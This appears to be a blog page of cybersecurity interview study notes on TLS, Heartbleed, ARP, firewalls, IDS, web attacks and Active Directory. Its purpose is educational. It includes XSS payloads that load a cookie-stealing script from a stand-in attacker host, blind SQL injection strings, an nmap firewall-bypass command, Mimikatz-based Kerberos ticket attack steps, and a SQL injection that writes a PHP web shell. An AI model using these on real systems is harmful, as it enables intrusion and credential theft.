+++
title =  "Common Cyber Security Interview Questions"
+++

<h1> <span style="color:#da1953">Com</span>mon Cybersecurity Interview Questions </h1>

Oct 24, 2020

<span style="color:#da1953">**DISCLAIMER: Informations are taken from varous resources such as Wikipedia, Forum, Youtube, University courses and many more. The page is frequently updated.**</span>

---

<h2> <span style="color:#da1953">Ind</span>ex </h2>

- [TLS (Transport Layer Security)](#TLS)
  - [Introduction](#)
  - [Digital Certificates](#)
  - [TLS Handshake](#)
  - [Heartbleed](#)
- [Digital Certificates](#DIGCERT)
- [DHCP Protocol](#DHCP)
- [ARP Protocol](#ARP)
- [Firewall](#FIREWALL)
- [IDS (Intrusion Detection System)](#IDS)
- [XSS (Corss Site Scripting)](#XSS)
- [Active Directory](#ACTDIR)
- [Subnetting and Calculations](#SUBNET)
- [DNS](#DNS)
- [Question and Answer](#QNA)

---

<h2 id=TLS> <span style="color:#da1953">TLS</span> (Transport Layer Security) </h2>

### Introduction

The protocols find widespread use in applications such as web browsing, email, instant messaging, and voice over IP (VoIP). Websites can use TLS to secure all communications between their servers and web browsers.

The TLS protocol aims primarily to provide privacy and data integrity between two or more communicating computer applications. When secured by TLS, connections between a client and a server should have one or more of the following properties:

- The connection is private (or secure) because symmetric cryptography is used to encrypt the data transmitted. The keys for this symmetric encryption are generated uniquely for each connection and are based on a shared secret that was negotiated at the start of the session (TLS handshake). The server and client negotiate the details of which encryption algorithm and cryptographic keys to use before the first byte of data is transmitted. The negotiation of a shared secret is both secure the negotiated secret is unavailable to eavesdroppers and cannot be obtained, even by an attacker who places themselves in the middle of the connection and reliable (no attacker can modify the communications during the negotiation without being detected).
- The identity of the communicating parties can be *authenticated* using public-key cryptography. This authentication can be made optional, but is generally required for at least one of the parties (typically the server).
- The connection is *reliable* because each message transmitted includes a message integrity check using a message authentication code to prevent undetected loss or alteration of the data during transmission.
- The TLS protocol comprises two layers: the TLS record and the TLS handshake protocols. TLS work in the application layer of TCP/IP model.

The TLS protocol comprises two layers: the TLS record and the TLS handshake protocols. TLS work in the application layer of TCP/IP model.

### Digital Certificates

A digital certificate certifies the ownership of a public key by the named subject of the certificate, and indicates certain expected usages of that key. This allows others (relying parties) to rely upon signatures or on assertions made by the private key that corresponds to the certified public key.

TLS typically relies on a set of trusted third-party certificate authorities to establish the authenticity of certificates.

### TLS Handshake

Step 1
![step 1](/interviewquestions/tls/step1.jpg)

The client sends its highest version of TLS, the available cryptographic algorithm and the data compression method that wants to use.

Step2
![step 2](/interviewquestions/tls/step2.jpg)

The server chooses the highest cryptographic protocol available from the list provided by the client, its session ID and its digital certificate with which the client can encrypt a shared secret key for the symmetric cryptography.

Step 3
![step 3](/interviewquestions/tls/step3.jpg)

The client verifies the authenticity of the certificate with the Certificate Authority.

Step 4
![step 4](/interviewquestions/tls/step4.jpg)

In this way, only the Server can decrypt the secret key which will be used for future communications and data transfer.

Step 5
![step 5](/interviewquestions/tls/step5.jpg)

The client is indication that his part of handshake is complete.

Step 6
![step 6](/interviewquestions/tls/step6.jpg)

The server is indicating that his part of handshake is complete.

Step 7
![step 7](/interviewquestions/tls/step7.jpg)

Now the client and server can exchange messages that are symmetrically encrypted.

### Heartbleed

Heartbeat is an echo functionality in SSL (older version of TLS) where either side (client or server) requests that a number of bytes of data that it sends to the other side be echoed back. Typically a text string, along with the payload's length as a 16-bit integer. The receiving computer then must send exactly the same payload back to the sender. The idea appears to be that this can be used as a keep-alive feature, with the echo functionality presumably meant to allow verifying that both ends continue to correctly handle encryption and decryption.

The affected versions of OpenSSL allocate a memory buffer for the message to be returned based on the length field in the requesting message, without regard to the actual size of that message's payload. Because of this failure to do proper bounds checking, the message returned consists of the payload, possibly followed by whatever else happened to be in the allocated memory buffer.

Heartbleed is therefore exploited by sending a malformed heartbeat request with a small payload and large length field to the vulnerable party (usually a server) in order to elicit the victim's response, permitting attackers to read up to 64 kilobytes of the victim's memory that was likely to have been used previously by OpenSSL. Where a Heartbeat Request might ask a party to "send back the four-letter word 'bird'", resulting in a response of "bird", a "Heartbleed Request" (a malicious heartbeat request) of "send back the 500-letter word 'bird'" would cause the victim to return "bird" followed by whatever 496 subsequent characters the victim happened to have in active memory.

![Heartbleed](/interviewquestions/heartbleed/heartbleedexample.svg)

---

<h2 id=DIGCERT> <span style="color:#da1953">Dig</span>ital Certificates </h2>

### Introduction

In cryptography, a certificate authority or certification authority (CA) is an entity that issues digital certificates. A digital certificate certifies the ownership of a public key by the named subject of the certificate. This allows others (relying parties) to rely upon signatures or on assertions made about the private key that corresponds to the certified public key. A CA acts as a trusted third party, trusted both by the subject (owner) of the certificate and by the party relying upon the certificate.

In cryptography, a public key certificate, also known as a digital certificate or identity certificate, is an electronic document used to prove the ownership of a public key. The certificate includes information about the key, information about the identity of its owner (called the subject), and the digital signature of an entity that has verified the certificate's contents (called the issuer). If the signature is valid, and the software examining the certificate trusts the issuer, then it can use that key to communicate securely with the certificate's subject. In Transport Layer Security (TLS) a certificate's subject is typically a computer or other device, though TLS certificates may identify organizations or individuals in addition to their core role in identifying devices. TLS is notable for being a part of HTTPS, a protocol for securely browsing the web.

In a typical public-key infrastructure (PKI) scheme, the certificate issuer is a certificate authority (CA), usually a company that charges customers to issue certificates for them. By contrast, in a web of trust scheme, individuals sign each other's keys directly, in a format that performs a similar function to a public key certificate.

![Digital certificate hierarchy](/interviewquestions/digitalcertificate/certificatehierarchy1.JPG)

---

<h2 id=DHCP> <span style="color:#da1953">DHC</span>P Protocol </h2>

### Introduction

The Dynamic Host Configuration Protocol (DHCP) is a network management protocol used on Internet Protocol (IP) networks whereby a DHCP server dynamically assigns an IP address and other network configuration parameters to each device on a network so they can communicate with other IP networks. A DHCP server enables computers to request IP addresses and networking parameters automatically from the Internet service provider (ISP), reducing the need for a network administrator or a user to manually assign IP addresses to all network devices. In the absence of a DHCP server, a computer or other device on the network needs to be manually assigned an IP address, or to assign itself an APIPA address, which will not enable it to communicate outside its local subnet.

DHCP can be implemented on networks ranging in size from home networks to large campus networks and regional Internet service provider networks. A router or a residential gateway can be enabled to act as a DHCP server.

### Overview

DHCP operates based on the client–server model. When a computer or other device connects to a network, the DHCP client software sends a DHCP broadcast query requesting the necessary information. Any DHCP server on the network may service the request. The DHCP server manages a pool of IP addresses and information about client configuration parameters such as default gateway, domain name, the name servers, and time servers. On receiving a DHCP request, the DHCP server may respond with specific information for each client, as previously configured by an  administrator, or with a specific address and any other information valid for the entire network and for the time period for which the allocation (lease) is valid. A DHCP client typically queries for this information immediately after booting, and periodically thereafter before the expiration of the information. When a DHCP client refreshes an assignment, it initially requests the same parameter values, but the DHCP server may assign a new address based on the assignment policies set by administrators.

Depending on implementation, the DHCP server may have three methods of allocating IP addresses:

- Dynamic allocation: A network administrator reserves a range of IP addresses for DHCP, and each DHCP client on the LAN is configured to request an IP address from the DHCP server during network initialization. The request-and-grant process uses a lease concept with a controllable time period, allowing the DHCP server to reclaim and then reallocate IP addresses that are not renewed.
- Automatic allocation: The DHCP server permanently assigns an IP address to a requesting client from the range defined by the administrator. This is like dynamic allocation, but the DHCP server keeps a table of past IP address assignments, so that it can preferentially assign to a client the same IP address that the client previously had.
- Manual Allocation: Also commonly called static allocation and reservations. The DHCP server issues a private IP address dependent upon each client's client id (or, traditionally, the client MAC address), based on a predefined mapping by the administrator. If no match for the client's client ID (if provided) or MAC address (if no client id is provided) is found, the server may or may not optionally fall back to either Dynamic or Automatic allocation.

DHCP is used for Internet Protocol version 4 (IPv4) and IPv6.

### Operations

Step 1
![Step 1](/interviewquestions/dhcp/step1.jpg)

When client boots up it broadcast a DHCPDISCOVER message looking for a DHCP server note dstIP address.

Step 2
![Step 2](/interviewquestions/dhcp/step2.jpg)

DHCPOFFER is a broadcast UDP packet and it replies with network configuration such as IP, lease time, DNS, subnet mask and default gateway, of course you can renew the lease when expired.

Step 3
![Step 3](/interviewquestions/dhcp/step3.jpg)

DHCPREQUEST says that the client accepts the configurations sent by the Server.

Step 4
![Step 4](/interviewquestions/dhcp/step4.jpg)

It is an acknowledgement packet to confirm that the server will registers client’s information.

---

ROUTING PROTOCOLS

OSPF

---

<h2 id=ARP> <span style="color:#da1953">ARP</span> Protocol </h2>

### Introduction

The Address Resolution Protocol (ARP) is a communication protocol used for discovering the link layer address, such as a MAC address.

Whenever a device needs to communicate with another device in a Local Area Network (LAN) it needs the MAC address for that device and devices use ARP protocol to acquire the MAC address for that device.

An IP address is used to locate a device on a network and the MAC address is what identify the actual device.

### Operating Scope

The Address Resolution Protocol is a request-response protocol whose messages are encapsulated by a link layer protocol. It is communicated within the boundaries of a single network, never routed across internetworking nodes.

### Arp Request/Response

An ARP probe is an ARP request broadcasted in to the LAN (also to the router) in search of the MAC address of a given IP and the host having the requested IP will send a response containing its MAC.

### Operations

Step 1
![Step 1](/interviewquestions/arp/step1.jpg)

The cliet sends a broadcast message because the destination MAC address is a broadcast address, simply saying anyone with IP address *192.168.1.50* if you hear me would you please give your packages, and here is my IP address and MAC address. The other devices will discard the ARP packet silently.

Step 2
![Step 2](/interviewquestions/arp/step2.jpg)

When the server hear the message, it sends a unicast message to the client because the detination IP address and MAC address belong to the client.

Step 3
![Step 3](/interviewquestions/arp/step3.jpg)

The client gets the server's MAC address and can sends the server a request. At the same time the client updates ARP cache tablesfor the future reference.

### ARP Spoofing

ARP spoofing is a technique that allows an attacker to craft a "fake" ARP packet that looks like it came from a different source, or has a fake MAC address in it.

### ARP Poisoning

An attacker uses the process of ARP spoofing to "poison" a victim's ARP table, so that it contains incorrect or altered IP-to-MAC address mappings for various attacks, such as a man-in-the-middle attack.

In computer networking, ARP cache poisoning, performend on a switch, is a technique by which an attacker sends (spoofed) Address Resolution Protocol (ARP) messages onto a local area network. Generally, the aim is to associate the attacker's MAC address with the IP address of another host, such as the default gateway, causing any traffic meant for that IP address to be sent to the attacker instead.

![ARPSpoofing](/interviewquestions/arp/arpspoofing.jpg)

---

<h2 id=FIREWALL> <span style="color:#da1953">Fir</span>ewall </h2>

### Network Layer Firewall or Packet Filters

Network layer firewalls, also called packet filters, operate at a relatively low level of the TCP/IP stack, blocking packets unless they match the established rule set. The firewall administrator may define the rules; or default rules may apply.

Network layer firewalls generally fall into two sub-categories, stateful and stateless.

A stateful firewall is a network firewall that tracks the operating state and characteristics of network connections traversing it. The firewall is configured to distinguish legitimate network packets for different types of connections. Only packets matching a known active connection are allowed to pass the firewall. In contrast a stateless firewall does not take context into account when determining whether to allow or block packets.

There are other type of filters such as Application-Layer Firewall that filter preprocesses packets depending on the source/destination application, Proxies may act as a firewall by responding to input packets (connection requests, for example) in the manner of an application, while blocking other packets, Network Address Translation (NAT) may hide the true address of computer which is connected to the network.

- A firewall restrict access from outside
- Prevent attackers from getting too close
- Restrict people from leaving

### Packet filters (stateless firewall)

- Drop packets based on their source or destination addresses or port numbers or flags
- No context, only contents
- Can operate on
  - Incoming interface
  - Outgoing interface
  - Both
- Check packets with fake IP addresses:
  - From outside (“ingress filtering”)
  - From inside (“egress filtering”)

### Problems with Packet Filters

- Payload of TCP packet is not inspected.
  - No protection against attacks based on upper-layer vulnerabilities.
- Limited logging ability (restricted to the few parameters used by the filter).
- No authentication facilities.
- Susceptible to attacks based on vulnerabilities in various implementations of TCP and/or IP.

### Stateful packet inspection

- Stateful Inspection Firewalls (or Dynamic Packet Filters) can keep track of established connections.
- Can drop packets based on their source or destination IP addresses, port numbers and possibly TCP flags.
  - Solve one major problem of simple packet filters, since they can check that incoming traffic for a high-numbered port is a genuine response to a previous outgoing request to set up a connection.

![Dynamic packet filter](/interviewquestions/firewall/dynamicpacketfilter.jpg)

### Common firewall weaknesses

- No content inspection causes the problems.
  - Software weakness (e.g. buffer overflow, and SQL injection exploits).
  - Protocol weakness (WEP in 802.11).
- No defense against.
  - Denial of service.
  - Insider attacks.
- Firewall failure has to be prevented.
  - Firewall cluster for redundancy.

---

<h2 id=IDS> <span style="color:#da1953">IDS</span> (Intrusion Detection System) </h2>

An intrusion detection system (IDS) is a device or software application that monitors a network or systems for malicious activity.

An Intrusion Detection System (IDS) aims at detecting the presence of intruders before serious damage is done.

The ultimate purpose of an intruder could be to:

- Prevent the legitimate users from using the system.
- Reveal confidential information.
- Use the system as a stepping stone to attack other systems.

Second generation IDS are IPS, Intrusion Prevention Systems, also produce responses to suspicious activity, for example, by modifying firewall rules or blocking switches ports.

![Ids](/interviewquestions/ids/ids.jpg)

An IDS (passive detection) can only detect and rise alarm of malicious activities and report it to the network administrator or SIEM.

### Types of IDS

- Host-based (HIDS):
  - Monitors events in a single host to detect suspicious activity.
  - Typically deployed on critical hosts offering public services.
  - Advantage: better visibility into behavior of individual applications running on the host.
- Network-based (NIDS):
  - Analyses network, transport and application protocol activity.
  - Often placed behind a router or firewall that is the entrance of a critical asset.
  - Advantage: single NIDS/IPS can protect many hosts and detect global patterns.
- Wireless (WIDS):
  - Analyses wireless networking protocol activity (not T- or A-layers).
  - Typically deployed in or near an organization's wireless network.

### IDS detection approach

- Behavior-based (anomaly detection):
  - Define behavioral characteristics of normal behavior.
  - Compare actual behavior with these. If there are significant differences, raise an alarm.
  - Difficult to define all possible normal behavior. New activities often give "false positives" (i.e. normal behavior classified as intrusion).
- Signature based (misuse detection):
  - Define characteristics of various types of abnormal activities.
  - Compare actual behavior with these. If any of them match, raise alarm!.
  - Difficult to produce a complete catalog of abnormal activities.
    - If any are missing, there will be "false negatives" (i.e. undetected intrusions)

### Signature-based IDS

- Starts from the idea that intruders/attacks may have a characteristic appearance which makes it possible to identify them.
- The idea is to screen the PAYLOADS of the packets looking for specific patterns -> no security signatures.
- Suppliers of IDSs maintain huge databases of signatures (code or data fragments) which characterize various classes of intruder.
- Rapid recognition involves searching for matches for one or more of the known signatures from a collection of many thousands of signatures

### Signature-based IDS principles

- A packet sniffer on steroids.
- Passive capturer of the packets in a LAN, it can bring to bear on the packets some fairly complex logic to decide whether an intrusion has taken place
  - SNORT is one of the best-known intrusion detectors
    - Easy-to-learn and easy-to-use rule language for intrusion detection
    - The rules are stored in /etc/snort/rules directory
- Con: can't inspect encrypted traffic (VPNs, SSL)
- Con: not all attacks arrive from the network
- Con: record and process huge amount of traffic

---

<h2 id=XSS> <span style="color:#da1953">XSS</span> (Cross Site Scripting) </h2>

### Introduction

It is a type of security vulnerability typically found in web applications. XSS attacks enable attackers to inject client-side scripts into web pages viewed by other users. A cross-site scripting vulnerability may be used by attackers to bypass access controls such as the same-origin policy.

### Examples

- **Reflected**: In a vulnerable website e query can be crafted in order to execute a custom script<br><br>
`http://bobssite.org/search?q=puppies<script%20src="http://mallorysevilsite.com/authstealer.js"></script>`<br><br>
or encode the ASCII characters with percent-encoding, such as<br><br>
`http://bobssite.org/search?q=puppies%3Cscript%2520src%3D%22http%3A%2F%2Fmallorysevilsite.com%2Fauthstealer.js%22%3E%3C%2Fscript%3E`.<br><br>
If this link is sent to the victim he/she will execute the script *authstealer.js* and any operation written there can be executed such as stealing authentication cookies and log in as him/her.

- **Stored**: In this case the script is put in a text are or wherever a user can write such as comments of posts, review etc...
If the site is vulnerable in the text are HTML commands can be execute so a proper XSS exploit can be crafted<br><br>
`I love the puppies in this story! They're so cute!<script src="http://mallorysevilsite.com/authstealer.js">`).<br><br>
If the link is clicked the script *authstealer.js* will run and operations will be executed.

- **DOM Based XSS**

https://www.youtube.com/watch?v=A5faK0BC8cE

---

<h2 id=CSRF> <span style="color:#da1953">CSR</span>F</h2>

CSRF is an attack that tricks the victim into submitting a malicious request. It inherits the identity and privileges of the victim to perform an undesired function on the victim’s behalf. Therefore, if the user is currently authenticated to the site, the site will have no way to distinguish between the forged request sent by the victim and a legitimate request sent by the victim.

CSRF attacks target functionality that causes a state change on the server, such as changing the victim’s email address or password, or purchasing something.

It’s sometimes possible to store the CSRF attack on the vulnerable site itself. Such vulnerabilities are called “stored CSRF flaws”. This can be accomplished by simply storing an IMG or IFRAME tag in a field that accepts HTML, or by a more complex cross-site scripting attack. If the attack can store a CSRF attack in the site, the severity of the attack is amplified. In particular, the likelihood is increased because the victim is more likely to view the page containing the attack than some random page on the Internet. The likelihood is also increased because the victim is sure to be authenticated to the site already.

---

<h2 id=ACTDIR> <span style="color:#da1953">Act</span>ive Directory </h2>

### Introduction

Active Directory (AD) is a directory service developed by Microsoft. A server running Active Directory Domain Service (AD DS) role is called a domain controller. It authenticates and authorizes all users and computers in a Windows domain type network—assigning and enforcing security policies for all computers and installing or updating software. For example, when a user logs into a computer that is part of a Windows domain, Active Directory checks the submitted password and determines whether the user is a system administrator or normal user. Also, it allows management and storage of information and provides authentication and authorization mechanisms.

### Services

Active Directory Services consist of multiple directory services.

#### Domain Service

Active Directory Domain Services (AD DS) is the foundation stone of every Windows domain network. It stores information about members of the domain, including devices and users, verifies their credentials and defines their access rights. The server running this service is called a domain controller. A domain controller is contacted when a user logs into a device, accesses another device across the network, or runs a line-of-business Metro-style app sideloaded into a device.

Other Active Directory services (excluding LDS, as described below) as well as most of Microsoft server technologies rely on or use Domain Services; examples include Group Policy, Encrypting File System, BitLocker, Domain Name Services, Remote Desktop Services, Exchange Server and SharePoint Server.

### Common Attacks

#### Kerberosting

This attack can be carried out by any user on a domain—not just administrators. It is an “offline” attack that doesn't require any packets be sent to the targeted service—traffic that would be logged and quite possibly trigger alerts. At its core, Kerberoasting is a password-cracking attack in which credentials are stolen from memory and cracked offline.

- Kerberoasting is a post-exploitation attack that extracts service account credential hashes from Active Directory for offline cracking.
- Kerberoasting is a common, pervasive attack that exploits a combination of weak encryption and poor service account password hygiene.
- Kerberoasting is effective because an attacker does not require domain administrator credentials to pull off this attack and can extract service account credential hashes without sending packets to the target.

Kerberoasting enables privilege escalation and lateral network movement. Kerberoasting is used by attackers once they are established inside an enterprise network and have begun reconnaissance for lateral movement. The technique allows the attackers, as valid domain users, to request a Kerberos service ticket for any service, capture that ticket granting service (TGS) ticket from memory, and then attempt to crack the service credential hash offline using any number of password-cracking tools, such as Hashcat, John the Ripper, and others.

Steps to compromise service with SPN:

- Get SPN (Service Principle Name) via script `GetUserSPNs.py`.
- Choose a SPN and request a ticket with the choosen SPN, susually the choosen SPN with high priviledge in order to priviledge escalete.
- The ticket will be in the memory encrypted with the NTLM hash of the password of the service account.
- Use Mimikatz to dump the ticket from memory.
- Crack the ticket offline with any tool.

or GetUserSPNs from Imapcket Suite can  be used to list and retrive the service ticket and then crack it offline ([tutorial](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#kerberoasting)).

#### Silver ticket

This technique requires a cracked service password which can be obtained via Kerberosting attack.

- Crack the password of a Service account obtained from Kerberosting attack.
- Attacker converts the password in NTLM Hash of the service account.
- Using Mimikatz forge a TGS ticket using NTLM hash of the service account.
- Attacker uses the ticket to access a specific service on a target host bypassing any communication with the Active Directory Domain Controller.
- Attacker is able to forge Privileged Account Certificate and other information as part of the service ticket.

https://www.youtube.com/watch?v=GTJyd-AMfuM

#### Golden ticket

- Once an attacker has obtained priviledged access to Active Directory, they can use Mimikatz to extract the KRBTGT (Kerberos Ticket Granting Ticket) accounts password hash, in addition to the name and the SID of the domainto which the KRBTGT account belongs.
- Using Mimikatz the attacker generates a ticket (a golden ticket) leveraging various command and paramenters.
- Once the golden ticket has been generated, the attacker will perform *Pass-The-Ticket* attack by loading the ticket into the current session providing them access to any resource connected to Active Directory.

https://www.youtube.com/watch?v=f6SleGakcE0

---

<h2 id=SUBNET> <span style="color:#da1953">Sub</span>netting and calculations</h2>

Address:   192.168.0.1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;11000000.10101000.00000000 .00000001<br>
Netmask:   255.255.255.0 = 24&nbsp;&nbsp;&nbsp;11111111.11111111.11111111 .00000000<br>
Wildcard:  0.0.0.255&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;00000000.00000000.00000000 .11111111<br>
=><br>
Network:   192.168.0.0/24&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;11000000.10101000.00000000 .00000000 (Class C)<br>
Broadcast: 192.168.0.255&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;11000000.10101000.00000000 .11111111<br>
HostMin:   192.168.0.1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;11000000.10101000.00000000 .00000001<br>
HostMax:   192.168.0.254&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;11000000.10101000.00000000 .11111110<br>
Hosts/Net: 254&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(Private Internet)<br>

192.168.0.0 identifies the whole network.<br>
192.168.0.255 broadcast address.<br>
Assignable IPs goes from 192.168.0.1 to 192.168.0.254<br>

"Explain how to calculate subnet"

---

<h2 id=DNS> <span style="color:#da1953">DNS</span></h2>

The Domain Name System (DNS) is a hierarchical and decentralized naming system for computers, services, or other resources connected to the Internet or a private network. It translates domain names into IP addresses needed for locating and identifying computer services and devices.

### Name Server

he Domain Name System is maintained by a distributed database system, which uses the client–server model. The nodes of this database are the name servers. Each domain has at least one authoritative DNS server that publishes information about that domain and the name servers of any domains subordinate to it.

![DomainNameSystem](/interviewquestions/dns/domainnamesystem.png)

### Authoritative Name Server

An authoritative name server is a name server that only gives answers to DNS queries ((NS) records) from data that has been configured by an original source, for example, the domain administrator or by dynamic DNS methods.

An authoritative name server can either be a primary server or a secondary server. A primary server is a server that stores the original copies of all zone records. A secondary server uses a special automatic updating mechanism in the DNS protocol in communication with its primary to maintain an identical copy of the primary records.

![DNSHierarchy](/interviewquestions/dns/dnshierarchy.jpg)

### Address Resolution Mechanism

#### Iterative Address Relosution

In Iterative DNS Query, when a DNS Client asks the DNS server for name resolution, the DNS Server provides the best answer it has. If the DNS Server doesn't know the answer to the DNS Query from Client, the answer can be a reference to another lower level DNS Server also. This lower level DNS Server is delegated at the higher level DNS Server to be Authoritative for the DNS namespace which the DNS Query is related with. Once the DNS Client get the referral from higher level DNS Server, it can then send a DNS Query to the lower level DNS server, got as referral.

![InterativeQuery](/interviewquestions/dns/iterativequery.png)

#### Recursive Address Resolution

A recursive query is a kind of query, in which the DNS server, who received your query will do all the job of fetching the answer, and giving it back to you. During this process, the DNS server might also query other DNS server's in the internet on your behalf, for the answer.

![RecursiveQuery](/interviewquestions/dns/recursivequery.jpg)

<h2 id=QNA> <span style="color:#da1953">Sam</span>e Origin Policy</h2>

The same-origin policy is a web browser security mechanism that aims to prevent websites from attacking each other.

The same-origin policy restricts scripts on one origin from accessing data from another origin. An origin consists of a URI scheme, domain and port number. This policy prevents a malicious script on one page from obtaining access to sensitive data on another web page through that page's Document Object Model.  For example, consider the following URL:

`http://normal-website.com/example/example.html`

This uses the scheme http, the domain normal-website.com, and the port number 80. The following table shows how the same-origin policy will be applied if content at the above URL tries to access other origins:

| URL accessed                            | Access permitted?                   |
|-                                       |-                                   |
| http: //normal-website.com/example/      | Yes: same scheme, domain, and port  |
| http: //normal-website.com/example2/     | Yes: same scheme, domain, and port  |
| https: //normal-website.com/example/     | No: different scheme and port     |
| http: //en.normal-website.com/example/  | No: different domain               |
| http: //www.normal-website.com/example/  | No: different domain              |
| http: //normal-website.com:8080/example/ | No: different port*                |

When a browser sends an HTTP request from one origin to another, any cookies, including authentication session cookies, relevant to the other domain are also sent as part of the request. This means that the response will be generated within the user's session, and include any relevant data that is specific to the user. Without the same-origin policy, if you visited a malicious website, it would be able to read your emails from GMail, private messages from Facebook, etc.

---

<h2 id=QNA> <span style="color:#da1953">Que</span>stion and Answer</h2>

### Difference between XSS and CSRF

Cross-site scripting (or XSS) allows an attacker to execute arbitrary JavaScript within the browser of a victim user.
Cross-site request forgery (or CSRF) allows an attacker to induce a victim user to perform actions that they do not intend to.

The consequences of XSS vulnerabilities are generally more serious than for CSRF vulnerabilities:

- CSRF often only applies to a subset of actions that a user is able to perform.  Conversely, a successful XSS exploit can normally induce a user to perform any action that the user is able to perform, regardless of the functionality in which the vulnerability arises.
- CSRF can be described as a "one-way" vulnerability, in that while an attacker can induce the victim to issue an HTTP request, they cannot retrieve the response from that request. Conversely, XSS is "two-way", in that the attacker's injected script can issue arbitrary requests, read the responses, and exfiltrate data to an external domain of the attacker's choosing.

### Describe Cross Site Request Forgery (CSRF)

Cross-Site Request Forgery (CSRF) is an attack that forces an end user to execute unwanted actions on a web application in which they’re currently authenticated. With a little help of social engineering (such as sending a link via email or chat), an attacker may trick the users of a web application into executing actions of the attacker’s choosing. If the victim is a normal user, a successful CSRF attack can force the user to perform state changing requests like transferring funds, changing their email address, and so forth. If the victim is an administrative account, CSRF can compromise the entire web application.

It’s sometimes possible to store the CSRF attack on the vulnerable site itself. Such vulnerabilities are called “stored CSRF flaws”. This can be accomplished by simply storing an IMG or IFRAME tag in a field that accepts HTML, or by a more complex cross-site scripting attack.

### Can CSRF tokens prevent XSS attacks?

Some XSS attacks can indeed be prevented through effective use of CSRF tokens. Consider a simple reflected XSS vulnerability that can be trivially exploited like this: `https://insecure-website.com/status?message=<script>/*+Bad+stuff+here...+*/</script>`

Now, suppose that the vulnerable function includes a CSRF token:

`https://insecure-website.com/status?csrf-token=CIwNZNlR4XbisJF39I8yWnWX9wX4WFoz&message=<script>/*+Bad+stuff+here...+*/</script>`

Assuming that the server properly validates the CSRF token, and rejects requests without a valid token, then the token does prevent exploitation of the XSS vulnerability. The clue here is in the name: "cross-site scripting", at least in its reflected form, involves a cross-site request. By preventing an attacker from forging a cross-site request, the application prevents trivial exploitation of the XSS vulnerability.

### What are the phases of a penetration test?

- Information Gathering
- Reconnaissance
- Discovery and Scanning
- Vulnerability Assessment
- Exploitation
- Post Exploitation

### What is the difference between a risk assessment, vulnerability assessment, and penetration test?

Risk Assessment is composed by 5 steps:

- **Context establishment**: Identify and describe the context of the Risk Assessment process, considering external and internal context. Must contain identification of the party involved, assumption declaration, relevant assets for RA, risk scales definition, risk evaluation criteria.
- **Risk identification**: is the set of activities aiming to identify, describe, and document risks and possible causes of risk.
  - Identify threats and understand how may lead to incident.
- **Risk Analysis**: is the activity aiming to estimate and determine the level of the identified risks, the level is derived from the combination of the likelihood and consequence. Likelihood estimation is to determine the frequency or probability of incidents to occur using the defined likelihood scale.
- **Risk Evaluation**: is the set of activities involving the comparison of the risk analysis results with the risk evaluation criteria to determine which risks should be considered for treatment.
- **Risk Treatment**: The risk treatment is the set of activities aiming to identify and select means for risk mitigation and reduction
  - Reduction: reduce the likelihood or the consequence of incidents
  - Retention: Accept the risk
  - Avoidance: avoid the activity that rise to the risk in question
  - Sharing: transfer the risk to another party, like an insurance or sub-contracting

A vulnerability assessment is a systematic review of security weaknesses in an information system. It evaluates if the system is susceptible to any known vulnerabilities, assigns severity levels to those vulnerabilities, and recommends remediation or mitigation, if and whenever needed.

A penetration testing is an authorized simulated cyberattack on a computer system, performed to evaluate the security of the system; this is not to be confused with a vulnerability assessment. The test is performed to identify weaknesses (also referred to as vulnerabilities), including the potential for unauthorized parties to gain access to the system's features and data. Pen testing can involve the attempted breaching of any number of application systems, (e.g., application protocol interfaces (APIs), frontend/backend servers) to uncover vulnerabilities, such as unsanitized inputs that are susceptible to code injection attacks.

### What is the difference between ARP Spoofing and ARP Poisoning?

ARP poisoning is an attack that is accomplished using the technique of ARP spoofing.

ARP spoofing is a technique that allows an attacker to craft a "fake" ARP packet that looks like it came from a different source, or has a fake MAC address in it.

An attacker uses the process of ARP spoofing to "poison" a victim's ARP table, so that it contains incorrect or altered IP-to-MAC address mappings for various attacks, such as a man-in-the-middle attack.

### When running an nmap scan, what source port can you specify to scan from to commonly bypass firewall rules?

A common error that many administrators are doing when configuring firewalls is to set up a rule to allow all incoming traffic that comes from a specific poert number. The *source-port* option of Nmap can be used to exploit this missconfiguration. Common ports that you can use for this type of scan are: 20, 53 and 67. `nmap --source-port 53 <IP/Host>`

### Differences between Netcat and Ncat

*nc* and *netcat* are two names for the same program (typically, one will be a symlink to the other). It is a computer networking utility for reading from and writing to network connections using TCP or UDP.

*Ncat* is the same idea, but from the Nmap project. Ncat was written for the Nmap Project as a much-improved reimplementation of the venerable Netcat.

### What about Blind SQL Injection and how is it different from other kinds?

Blind SQL injection arises when an application is vulnerable to SQL injection, but its HTTP responses do not contain the results of the relevant SQL query or the details of any database errors.

With blind SQL injection vulnerabilities, many techniques such as UNION attacks, are not effective because they rely on being able to see the results of the injected query within the application's responses. It is still possible to exploit blind SQL injection to access unauthorized data, but different techniques must be used.

In this situation there is no result of the query but a feedback from the application which can be any arbitrary string, while in case of failure there will be no type of response. For example, suppose there is a table called Users with the columns Username and Password, and a user called Administrator. We can systematically determine the password for this user by sending a series of inputs to test the password one character at a time.

To do this, we start with the following input:

`xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'r`
`xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'o`
`xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'o`
`xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't`

When a letter give a feedback it means that the letter is part of the password, many other techniques may be found [here](https://portswigger.net/web-security/sql-injection/blind).

### How can SQL Injection lead to remote code execution?

With SQL Injection we can write a php web shell file in order to exececute it later and inject commands.

`' union select 1, '<?php system($_GET["cmd"]); ?>' into outfile '/var/www/dvwa/cmd.php' #`

